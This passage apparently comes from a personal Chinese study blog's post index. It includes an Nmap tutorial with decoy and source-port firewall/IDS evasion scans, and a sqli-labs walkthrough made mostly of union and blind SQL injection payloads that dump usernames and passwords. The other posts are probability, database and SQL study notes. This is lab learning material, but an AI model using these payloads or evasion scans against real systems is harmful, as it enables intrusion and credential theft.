level（-v/ -vv），当检测到开放端口时，它将直接显示给我们Nmap\n1 sudo nmap 10.129.2.28 -p- -sV -v 扫描选项 描述 10.129.2.28 扫描指定目标。 -p- 扫描所有端口。 -sV 对指定端口执行服务版本检测。 -v 增加扫描的详细程度，以显示更详细的信息。 横幅抓取 Nmap则尝试通过基于签名的匹配系统识别它们，但这会大大增加扫描的持续时间。Nmap所呈现结果的一个缺点是自动扫描可能会遗漏一些信息，因为有时Nmap不知道如何处理它。\n某些服务可能不会立即提供此类信息。也可以从相应的服务中删除或操纵横幅。如果我们manually使用 连接到 SMTP 服务器nc，抓取横幅，并使用 拦截网络流量tcpdump，我们就可以看到Nmap未显示的内容。\n传输控制包Tcpdump 1 sudo tcpdump -i eth0 host 10.10.14.2 and 10.129.2.28 nc 1 nc -nv 10.129.2.28 25 Nmap脚本引擎 它为我们提供了在 Lua 中创建脚本以与某些服务进行交互的可能性。这些脚本总共可分为 14 个类别：\n类别 描述 auth 确定身份验证凭证。 broadcast 通过广播来发现主机的脚本以及发现的主机可以自动添加到剩余的扫描中。 brute 执行脚本，尝试通过使用凭证进行暴力破解来登录相应的服务。 default 使用该-sC选项执行的默认脚本。 discovery 无障碍服务的评估。 dos 这些脚本用于检查服务是否存在拒绝服务漏洞，由于它会损害服务，因此使用较少。 exploit 此类脚本尝试利用扫描端口的已知漏洞。 external 使用外部服务进行进一步处理的脚本。 fuzzer 这使用脚本通过发送不同的字段来识别漏洞和意外的数据包处理，这可能需要很长时间。 intrusive 可能对目标系统产生负面影响的侵入性脚本。 malware 检查某些恶意软件是否感染了目标系统。 safe 不执行侵入性和破坏性访问的防御脚本。 version 服务检测的扩展。 vuln 识别特定的漏洞。 默认脚本 -sC\n特定脚本类型\u0026ndash;script 定义脚本 \u0026ndash;script ,\nNmap - Aggressive Scan -A 1 sudo nmap 10.129.2.28 -p 80 -A -A 执行服务检测、操作系统检测、跟踪路由并使用默认脚本扫描目标。 发现了系统上运行着哪种 Web 服务器,使用了哪种 Web 应用程序，以及网页的标题 。 漏洞评估 --script vuln 使用指定类别的所有相关脚本。 防火墙和IDS/IPS规避 TCP SYN扫描又称“半开扫描”。回顾TCP连接的三次握手，申请方首先发送的是一个SYN数据包，服务方在接到这个SYN数据包后，如果该端口处于侦听状态，则会回复一个SYN|ACK的数据包；如果该端口没有处于侦听状态，则会回复一个RST的数据包。而此时如果对方处于侦听状态，申请方还需要再向对方回复一个ACK数据包以示建立连接。此时对方就认为连接建立，并记入日志。\n无论服务方回复SYN|ACK的数据包，还是回复RST的数据包，申请方其实已经能够判断对方端口是否为“开”的状态。之后的ACK数据包发送则被对方监视，如果此时不发送ACK数据包，而是发一个RST数据包，则不仅关闭了这个未完成的连接过程，并且也会因为连接未建立而不会被对方记录。这种扫描方式因为使用了SYN标志位，所以被称为TCP SYN扫描。这种扫描技术的优点在于一般不会在目标计算机上留下记录，有时即使在用netstat命令也显示不出来；但这种方法的一个缺点是必须要有管理员权限才能建立自己的SYN数据包。\n使用诱饵扫描 Nmap 会生成插入到 IP 标头中的各种随机 IP 地址，以掩盖发送的数据包的来源。使用此方法，我们可以随机生成 ( RND) 个特定数量（例如：5）的 IP 地址，并以冒号 ( :) 分隔。然后，我们的真实 IP 地址会随机放置在生成的 IP 地址之间\n1 sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5 扫描选项 描述 10.129.2.28 扫描指定目标。 -p 80 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 -D RND:5 生成五个随机 IP 地址，指示连接来自的源 IP。 DNS 代理 过滤端口的 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace 从 DNS 端口进行 SYN 扫描 1 sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53 现在我们已经发现防火墙接受了TCP port 53，因此很可能 IDS/IPS 过滤器的配置也比其他过滤器弱得多。我们可以通过使用 尝试连接到此端口来测试这一点Netcat。\n扫描选项 描述 10.129.2.28 扫描指定目标。 -p 50000 仅扫描指定端口。 -sS 对指定端口执行 SYN 扫描。 -Pn 禁用 ICMP Echo 请求。 -n 禁用 DNS 解析。 --disable-arp-ping 禁用 ARP ping。 --packet-trace 显示所有发送和接收的数据包。 --source-port 53 从指定的源端口执行扫描。 连接到过滤端口 1 ncat -nv --source-port 53 10.129.2.28 50000 ","date":"2025-01-12T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nmap%E5%9F%BA%E7%A1%80/","title":"nmap基础"},{"content":" 工具：phpstudy，Hackbar 搭建靶场：sqli-labs(从Github上下载官方的，有些民间的可能会有木马) 数据库：mysql5.7 联合注入 需要页面有回显位\n查找注入点\n判断使字符型还是数字型注入id=2-1\n如果是字符型，找到闭合方式，‘，“，’)\n判断查询列数，order by\n查询回显位置，同时将原先的查询id注释掉\n拿到表名和列名：数据库（information_schema），表名集合表（tables），列名集合表（columns）用group_concat()确保所有查询信息能放到一行显示出来\nless-1 判断是否存在sql注入\n\u0026ndash;+表示对多余的引号进行注释，因为是字符型，数字型就不用管\n1 ?id=1\u0026#39; order by 3--+ 显示正常\n1 ?id=1\u0026#39; order by 4--+ 报错\n得知less-1共有三列，爆出显示位\n1 ?id=1\u0026#39; union select 1,2,3--+ 在mysql里面尝试union select\n1 ?id=-1\u0026#39; union select 1,2,3--+ 使id=-1报错注释，页面显示正常\n获取数据名\n1 ?id=-1\u0026#39; union select 1,database(),version() --+ 中间省略了一些过程详见less-2\n查询用户名和密码\n1 ?id=-1\u0026#39; union select 1,group_concat(username,\u0026#39;~\u0026#39;,password),3 from users--+ less-2 判断为数字型，页面改变\n1 ?id=2-1 ？id=2 三列\n1 ?id=1 order by 3 闭合方式为‘\n1 ?id=1\u0026#39; order by 3 爆数据名\n1 ？id=-1 union select 1,database(),version() 爆表名\n1 ?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; 爆列名\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;security\u0026#39; less-3 与前两关不同的地方是闭合方式\n1 ?id=1\u0026#39; 单引号加括号，后续一律以?id=1\u0026rsquo;)开头，和上面同\nless-4 判断得知闭合方式双引号加括号\n1 /?id=2\u0026#34; 布尔盲注 页面没有回显，只适用于Mysql，本质就是猜数字游戏，ASCII码判断用二分法，对于字符长度判断可以直接猜大小\n判断得知闭合方式为'\n二分法判断数据库长度 1 2 3 4 ?id=1\u0026#39; and length(database())\u0026gt;10--+ //不显示 ?id=1\u0026#39; and length(database())\u0026gt;5--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;7--+ //正常显示 ?id=1\u0026#39; and length(database())\u0026gt;8--+ //不显示 得知database（）长度为8\n二分法利用ASCII码判断字符 1 2 3 4 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;100--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;114--+ //正常显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;120--+ //不显示 ?id=1\u0026#39; and ascii(substr(database(),1,1))\u0026gt;115--+ //不显示 得知第一个字符ASCII码为115，即“s”\n依次判断8个字符，知当前数据库为security\n判断当前数据库的表 判断是否存在admin表\n1 ?id=1\u0026#39; and exists(select * from admin)--+ 判断表的个数 1 2 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;4--+ //正常显示 ?id=1\u0026#39; and (select count(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39;)\u0026gt;3--+ //不显示 逐一判断表名字符长度 1 ?id=1\u0026#39; and length((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1))=6--+ 逐一判断表名字符的ASCII码 1 ?id=1\u0026#39; and ascii(substr((select table_name from information_schema.tables where table_schema=\u0026#39;security\u0026#39; limit 0,1),1,1))\u0026gt;100--+ 存在emails,referers,uagents,users\n对column执行相同的操作，where语句修改 1 where table_name = \u0026#39;users\u0026#39; //以及uagents,referers,emails.......一个一个判断，虽然这个过程真的十分漫长 得知users中有三个字段id,username,password\n判断字段长度 1 ?id=1\u0026#39; and length((select id from users limit 3,1))=1--+ 判断字段ASCII值 1 ?id=1\u0026#39; and ascii(substr((select id from users limit 3,1)),1,1)\u0026gt;100--+ ","date":"2025-01-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sqli-labs%E9%80%9A%E5%85%B3/","title":"sqli-labs通关"},{"content":"记号\n$$\\binom n{n_1,n_2,\\cdots,n_r}=\\frac{n!}{n_1!n_2!\\cdots n_r!}$$因此，$\\binom n{n_1,n_2,\\ldots,n_r}$表示把 $n$ 个 不 同 的 元 素 分 成 大 小 分 别 为 $n_1, n_2, \\ldots , n_r$的$r$个\n不同组的组合数. 例 5e 假设有$n+m$个球，其中$n$个红的，$m$个蓝的，将它们随机排成一排，即所$(n+m)!$种排列都是等可能的. 如果只记录连续排列的球的颜色，证明各种可能的结果概率是一样的. 解 我们将$(n+m$)个球的次序排列称为一组球的排列，将 $n+m$ 个球的颜色次序排称为一组球的颜色次序排列. 球的排列共有($n+m$)!种，在红球之间作任何一个位于换，在蓝球之间作任何一个位置置换，置换的结果并不影响球的颜色次序排列. 从而组球的颜色次序排列，对应于$n!m!$个球的排列，这说明球的次序排列也是等可能的且每一种颜色次序出现的概率为$n!m!/(n+m)!.$\n多项式定理\n$$(x_{1}+x_{2}+\\cdots+x_{r})^{n}=\\sum_{\\begin{array}{c}(n_{1},\\cdots,n_{r}):\\\\n_{1}+\\cdots+n_{r}=n\\end{array}}\\binom{n}{n_{1},n_{2},\\cdots,n_{r}}x_{1}^{n_{1}}x_{2}^{n_{2}}\\cdots x_{r}^{n_{r}}$$上式的求和号是对满足 $n_1+n_2+\\cdotp\\cdotp\\cdotp\\cdotp+n_r=n$ 的所有非负整数向量($n_1,n_2,\\cdotp\\cdotp\\cdotp,n_r)$求和.\n命题 6.1 共有$\\binom{n-1}{r-1}$个不同的正整数向量$(x_1,x_2,\\cdots,x_r)$满足 为了得到非负整数解(而不是正整数解)的个数，注意，$x_1+x_2+\\cdots+x_r=n$的非负整数解个数与$y_1+y_2+\\cdotp\\cdotp\\cdotp+y_r=n+r$的正整数解个数是相同的(令$y_i= x_i+ 1$, $i= 1$, $\\cdots$, $r) .$ 因此，利用命题 6.1,可得到如下命题。\n生日问题 如果房间里有$n$个人，那么没有两人的生日是同一天的概率是多大？当$n$多大 时，才能保证此概率小于1/2? 解 每个人的生日都有 365 种可能，所以$n$个人一共是 365\u0026quot; 种可能(此处忽略有人生日是 2月 29 日的可能性). 假定每种结果的可能性都是一样的，那么所求事件的概率为$365\\times364\\times363\\times\\cdots\\times(365-n+1)/365^n.$令人惊奇的是，一旦$n\\geqslant23$,这个概率就比1/2要小. 即房间里人数如果超过 23 的话，那么至少有两人为同一天生日的概率就大于 1/2. 很多人一开始对这个结果很吃惊，因为 23 相对于一年 365 天来说太小了.然而，对每两个人来说，生日相同的概率为$\\frac{365\\cdot\\tilde{}}{(365)^2}=\\frac1{365}$,23个人一共可以组成$\\binom{23}2=253$ 对，这样来看上述结果似乎就不再令人吃惊了.\n配对问题 假设有 N 位男士参加舞会，所有人都将帽子扔到房间中央混在一 起，然后每人再随机拿一顶帽子.所有人都没有拿到自己帽子的概率是多少？ 解 先计算至少有一人拿到自己的帽子的概率.令$E_i(i=1,2,\u0026hellip;,N)$表示事件“第$i$ 人拿到了自己的帽子”.这样，由命题 4.4,至少有一人拿到了自己的帽子的概率为：\n$$P\\Big(\\bigcup_{i=1}^{N}E_{i}\\Big)\\:=\\sum_{i=1}^{N}P(E_{i})-\\sum_{i_{1}","date":"2024-12-27T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%A6%82%E7%8E%87%E8%AE%BA%E6%A8%A1%E5%9E%8B%E5%8F%8A%E5%B0%8F%E7%BB%93/","title":"概率论模型及小结"},{"content":"第二章 关系数据库 1.试述关系模型的三个组成部分\n关系数据结构：只包含单一的数据结构——关系，由三种类型：基本关系（基本表），查询表和视图表\n关系操作集合：查询（选择，投影，并，差，笛卡尔积），插入，删除，修改\n关系完整性约束\n2.关系数据语言的特点和分类\n(1)关系代数语言 (2)关系演算语言：元组关系演算语言和域关系演算语言 (3)SQL：具有关系代数和关系演算双重特点的语言\n3.解释术语，说明关系与联系\n（1）域：一组具有相同数据类型的值的集合\n（2）笛卡尔积：给定一组域D1,D2,\u0026hellip;,Dn,D1×D2×\u0026hellip;×Dn={(d1,d2,\u0026hellip;,dn),di∈Di}\n（3）关系：D1×D2×\u0026hellip;×Dn（笛卡尔积）的有限子集，表示为R（D1,D2,D3,\u0026hellip;,Dn），n=1，一元关系，n=2，二元关系，也是一张二维表\n（4）元组：笛卡尔积中每一个元素{(d1,d2,\u0026hellip;,dn),di∈Di}，一个n元组\n（5）属性：在二维表中，是一列，n目关系有n个属性（列）\n（1）主码：从多个候选码中选定一个作为主码\n（2）候选码：某一属性组的值额能唯一的标识一个元组，而其子集不能\n（3）外码：关系R中的一个属性F并不是R的码，但对应另一个关系S中的主码Ks，F称为R和S的外码，定义在同一个域上\n（1）关系模式（型）：关系的描述，R（U,D,DOM,F)，R为关系名，U为属性名集合，D为属性来自的域，DOM为属性向域的映像集合（如属性的类型，长度\n（2）关系（值）：包括基本关系（基本表），查询表，视图表\n（3）关系数据库：所有关系的集合\n4.举例说明关系模式和关系的联系\n关系是关系模型在某一时刻的状态或内容，关系模式是静态的，稳定的，关系是动态的，随时间不断变化的。\n5.试述关系模型的完整性规则。在参照完整性中，说明情况下外码属性的值可以为空值\n实体完整性：主属性不能去空值（null）\n参照完整性：两个关系之间存在着属性的引用，如学生的学号取值需要参照专业关系中的专业号\n用户定义的完整性：应用领域需要遵循的约束条件，语义约束\n在参照完整性规则中，外码属性的值可以取空值只有当外码的每个属性值取空值（二维表中每一列都是NULL）\n6.试述等值连接与自然连接的区别和联系\n自然连接是一种特殊的等值连接，，自然连接取消重复列\n7.关系代数的基本运算\n传统的集合运算：二目运算，包括并，差，交，笛卡尔积\n专门的关系运算：选择，投影，连接（查询就是一个关系在属性上的投影，取消某些列和重复元组），除运算\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%BA%8C%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第二章习题答案"},{"content":"第一章 绪论 1.试述数据，数据库，数据库管理系统，数据库系统的概念\n数据：描述事物的符号 数据库DB：长期储存在计算机内，有组织的，可共享的大量数据的集合。数据库中的数据按一定的数据模型组织，描述和储存，具有较小的冗余度，较高的数据独立性和易扩展性，并可为各种用户共享 数据库管理系统DBMS：系统软件，有以下功能： 数据定义 数据组织，存储和管理 数据操纵功能 数据库的事务管理和运行管理 数据库建立和维护 数据库系统DBS：由DB，DBMS,DA组成的存储，管理，处理和维护数据的系统 2.使用数据库有什么好处？\n数据结构化：整体和内部\n数据的共享性高，冗余度低且易扩展：大大减少数据冗余，节约存储空间，避免数据之间的不相容性与不一致性\n数据独立性高：\n物理独立性，用户的应用程序与数据库中数据库数据的物理存储相互独立 逻辑独立性：用户的应用程序与数据库的逻辑结构是相互独立 数据由数据库管理系统统一管理和控制\n数据的安全性保护：保护数据以防止不合法使用造成的数据泄密和破坏 数据的完整性检查：数据的正确性，有效性和相容性 用户可以并发控制 数据库恢复功能：比如说rollback 3.试述文件系统与数据库系统的区别和联系\n见P7表1.1\n6.数据库管理系统的主要功能\n在数据库建立，运用和维护时对数据库进行统一控制，以保证数据的完整性和安全性，并在多用户同时使用数据库时进行并发控制，在发生故障后对数据库进行恢复\n7.什么是概念模型？试述概念模型的作用\n信息模型，按用户的观点对数据和信息建模，主要用于数据库设计，用于信息世界的建模\n8.定义并解释概念模型中以下术语：\n实体：客观存在并可相互区别的事物。如具体的人，事，物，抽象的概念或联系\n实体型：用实体名及其属性名集合来抽象和刻画同类实体，如学生（学生号，姓名，性别，所在院系\u0026hellip;)\n实体集：同一类型实体的集合。例如，全体学生就是一个实体集\n实体之间的联系：或称不同实体集之间的联系\n9.试述数据模型的概念，数据模型的作用和数据模型的三个要素\n对现实世界数据特征的抽象，用来描述数据，组织数据和对数据进行操作\n比较真实地模拟现实世界 容易为人所理解 便于在计算机上实现 10.试述层次模型的概念，举出三个实例\n有且只有一个结点没有双亲结点（根节点），根以外的其他结点有且只有双亲结点，实例：行政结构，家族关系，生物分类学，电脑文件系统\n11.试述网状模型的概念，举出三个实例\n允许一个以上的结点无双亲，一个结点可以有多于一个的双亲，如互联网，社交网络，地铁交通网络\n12.试述层次，网状模型的优缺点\n层次模型的优点：\n数据结构简单清晰 数据库的查询效率高 层次数据模型提供了良好的完整性支持 层次模型的缺点：\n现实世界中很多联系是非层次性的 如果一个结点具有多个双亲结点等，不便于用层次模型表示联系 查询子女结点必须通过双亲结点 由于结构严密，层次命令趋于程序化 网状模型的优点：\n能够更为直接地描述现实世界，如一个结点可以有多个双亲，结点之间可以有多种联系 具有良好地性能，存取效率较高 网状模型的缺点：\n结构过程比较复杂 网状模型的DDL,DML复杂，需要嵌入语言 记录之间的联系通过存取路径实现，应用程序在访问数据时候必须选择适当的存取路径，用户必须了解系统结构的细节，加重了应用程序的负担 13.试述关系模型的概念，定义并解释以下术语\n关系模型由一组关系组成，每个关系的数据结构都是一张规范化的二维表。\n元组：表中的一行即为一个元组\n属性：表中的一列即为一个属性\n关系：一个关系对应以一张表\n码：某个可以唯一确定一个元组的属性组，如学生的学号\n域：一组具有相同数据类型的值的集合，如性别的域是{男，女}，大学生奈年龄属性的域是（15，45）\n分量：元组中的一个属性值\n14.试述关系数据库的特点\n规范化，即关系的每一个分量必须是一个不可分的数据项\n关系模型与格式化模型不同，建立在严格的数学概念的基础上\n概念单一，实体间的联系，对数据的检索和更新也是关系（Table），数据结构简单清晰\n存取路径透明，更高的数据独立性，更好的安全保密性，简化程序员的工作，但查询效率较低\n** 在计算机中，从某个角度*看不到的特性称该特性是透明的*。这个意义上的“透明”与社会生活中的透明含义*恰好相反*，例如计算机组织对程序员是透明的，就是说计算机组织对程序员来说是看不到的，也不需要看到的。*和汉语字典里面的意思不一样。 ***\n15，试述数据库系统的三级模式结构，并说明优点\n外模式，模式，内模式\n外模式：子模式或用户模式，数据库用户能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数据视图，是与某一应用有关的数据的逻辑表示\n内模式：存储模式，数据物理结构和存储方式的描述，是数据在数据库内部的组织方式\n模式：逻辑模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图，一个数据库只有一个模式\n使用户能够逻辑的，抽象的处理数据，而不必关心数据在计算机中的具体表示方式与存储方式\n17.什么叫数据与程序的物理独立性？数据与程序的逻辑独立性？为什么数据库由数据与程序的独立性？\n物理独立性：当数据库的存储结构改变时，由数据库管理员对模式/内模式映像作响应改变\n逻辑独立性：当模式改变时，由数据库管理员对各个外模式/模式的影响作相应改变，可以使外模式保持不变。应用程序是依据数据的外模式编写，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。\n数据与程序之间的独立性使得数据的定义和描述可以从应用程序中分离出去。由于数据的存储由数据库管理系统管理，从而简化了应用程序的编制，大大减少了应用程序的维护和修改。\n18.试述数据库系统的组成\n数据库，数据库管理系统，应用程序和数据库管理员\n","date":"2024-12-09T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%B9%A0%E9%A2%98%E7%AD%94%E6%A1%88/","title":"数据库系统概论第一章习题答案"},{"content":"“中国的孩子自一出生就在冲刺，从双语幼儿园到重点高中，再经历千军万马过独木桥的高考。\n在人类前半生的这场性爱过程中，他们做足了前戏，也做了太久前戏，\n而这一切都在上大学时完成了痛快的射精，仿佛所有分泌的前列腺液都是值得的”\n","date":"2024-12-05T00:00:00Z","image":"https://Frederick2313072.github.io/p/20%E5%B2%81%E4%BA%86%E4%BD%86%E6%9C%89%E4%BA%9B%E8%AF%B4%E4%BA%86%E4%B8%8D%E5%A6%82%E4%B8%8D%E8%AF%B4/547a6a87146ee7bd92f1c1efdf2458045e2f600d_hu_c3d7546e34c20d63.jpg","permalink":"https://Frederick2313072.github.io/p/20%E5%B2%81%E4%BA%86%E4%BD%86%E6%9C%89%E4%BA%9B%E8%AF%B4%E4%BA%86%E4%B8%8D%E5%A6%82%E4%B8%8D%E8%AF%B4/","title":"20岁了但有些说了不如不说"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 SELECT RTRIM(vend_name) + \u0026#39;(\u0026#39;+ --右边取消空格 RTRIM(vend_country) + \u0026#39;)\u0026#39; AS vend_title From Vendors ORDER BY vend_name; SELECT prod_id,quantity,item_price,quantity*item_price AS expanded_price FROM OrderItems; SELECT vend_name,UPPER(vend_name) --大写 AS vend_name_upcase FROM Vendors ORDER BY vend_name; SELECT cust_name,cust_contact FROM Customers WHERE SOUNDEX(cust_contact) = SOUNDEX(\u0026#39;Michael Green\u0026#39;); --近似发音 SELECT order_num FROM Orders WHERE DATEPART(yy,order_date) = 2020; SELECT AVG(prod_price) AS avg_price --取平均值 FROM Products WHERE vend_id = \u0026#39;DLL01\u0026#39;; SELECT COUNT(*)AS num_cust --对所有行计数 FROM Customers; SELECT MAX(prod_price) AS max_price FROM Products; SELECT SUM(quantity*item_price) AS items_ordered FROM OrderItems WHERE order_num = 20005; SELECT AVG(DISTINCT prod_price) AS avg_price FROM Products Where vend_id =\u0026#39;DLL01\u0026#39;; SELECT COUNT(*) AS num_items,MIN(prod_price) AS price_min,MAX(prod_price) AS proce_max,AVG(prod_price) AS price_avg --组合聚集函数 FROM products; SELECT vend_id,COUNT(*) AS num_prods FROM Products Group BY vend_id HAVING COUNT(*) \u0026gt;= 2;--过滤分组，group by 和 having结合 SELECT order_num,COUNT(*)AS items FROM OrderItems Group BY order_num HAVING COUNT(*) \u0026gt;= 3--检索包含三个或更多物品的订单号和订购物品的数目 ORDER BY items,order_num;--按订购物品的数目排序输出，having在group by前，order by后 SELECT cust_id FROM OrderItems WHERE prod_id = \u0026#39;RGAN01\u0026#39;; SELECT cust_id FROM Orders WHERE order_num IN (20007,20008); SELECT cust_id FROM Orders WHERE order_num IN (SELECT cust_id FROM Orders WHERE order_num IN (20007,20008));--建立以上的子查询，由内向外 SELECT cust_name,cust_state,(SELECT COUNT(*)FROM Orders WHERE Orders.cust_id=Customers.cust_id) AS orders --子查询对检索出的每个顾客执行一次，用句点避免混淆列名 FROM Customers ORDER BY cust_name;--对于检索出的每个顾客，统计其在Orders表中的订单数目 SELECT vend_name,prod_name,prod_price FROM Vendors,Products WHERE Vendors.vend_id = Products.vend_id; BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 BEGIN TRANSACTION DELETE OrderItems WHERE order_num =12345 SAVE TRANSACTION delete1;--使用保留点delete1，保留点越多越好，额能进行灵活的回退 DELETE Orders WHERE order_num =12345 ROLLBACK TRANSACTION delete1;--回退到保留点delete1 COMMIT TRANSACTION--控制事物处理，最后的commit仅在中间过程不出错的情况下写出更改 DECLARE CURSOR CustCursor IS SELECT * FROM Customers WHERE cust_email IS NULL; ALTER TABLE Vendors ADD CONSTRAINT PRIMARY KEY(vend_id)--设置主键，DBMS默认主键基本不修改或更新，不能重用 ALTER TABLE Orders ADD CONSTRAINT FOREIGN KEY (cust_id) REFERENCES Customers(cust_id);--将此表中的cust_id设置为Customers的主键，即外键。外键有助防止意外删除，若删除，级联删除 CREATE INDEX prod_name_ind--索引名 ON Products(prod_name)--被索引的表，列 CREATE TRIGGER customer_state ON Customers FOR INSERT,UPDATE AS UPDATE Customers SET cust_state=Upper(cust_state) WHERE Customers.cust_id = inserted.cust_id;--创建一个触发器，对所有INSERT和UPDATE操作，将cust_state转为大写 ","date":"2024-12-05T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/sql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A%E4%BE%8B%E5%AD%90/","title":"SQL必知必会例子"},{"content":"Python 爬虫 建模 数据挖掘（统计方向的待定） JS 做个代办事项列表（我所能想到JS对我的唯一用处就是网页加个响应什么的）\n重新巩固C语言 Unity 学习C#语言，可能大创写个游戏，或者跟之前联系好的设计系朋友写着玩玩\nLeetcode 刷题周赛 算法与数据结构 算是提前预习大三内容，以及体验下朋友所说的算法addiction\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/plan-after-this-semester/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202170215_hu_f5523af80b8f11a1.jpg","permalink":"https://Frederick2313072.github.io/p/plan-after-this-semester/","title":"Plan after this semester"},{"content":"Python 基础语法到面向对象编程，小项目只用过pygame写了一个窗口射击游戏，图灵系列那本python编程学的很流畅，很快能上手项目\nJavascript 到现在只学了点皮毛，只会做动态内容更新，也只是自己做html网页时乱加上去的\nLinux 一开始甚至打算买个电脑重装Linux，看到无数人因为Linux整个大学没敲几行代码被劝退了，最后只学了Bash，但是和windows的shell不兼容，用的乌班图版本，以下是我试过的所有办法：\n虚拟盘开机和Windows双系统 虚拟机如virtualbox和Vmware（据说可以申请阿里云学生服务器，但我用的前者） Windows自带wsl，最后自己搞了个图形化界面，甚至现在偶尔还在用 工具 Vim：很容易上手，但不常用就会很快忘了（谁没事会在shell里面编辑文本） Nano：可读性比Vim强，但我已经习惯Vim了 SSH Docker Git：最重要的一个，不用多说 数据库 学校课程，但反而很不上心，明天开始重学\nCS常识 b站有个做的很好的科普视频，会放在Resource里面\nHtml 严格来说，太简单算不上编程语言\nCSS 之前自己做了个CSS模板，结果在运行cmd时被tailwind覆盖完了，没有git到远程仓库\u0026hellip;\u0026hellip;\n数学分析3，概率论 前者太难听不懂，后者太简单不想听\n","date":"2024-12-02T00:00:00Z","image":"https://Frederick2313072.github.io/p/summary-in-november/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20241202225640_hu_95a0bebc19439f13.jpg","permalink":"https://Frederick2313072.github.io/p/summary-in-november/","title":"Summary in November"},{"content":"第三章 SQL 1.试述SQL的特点\n综合统一，高度非过程化，面向集合的操作方式，以同一种语法结构提供多种使用方式\n2.说明在DROP TABLE时，RESTRICT和CASCADE的区别\n","date":"0001-01-01T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/","title":""}]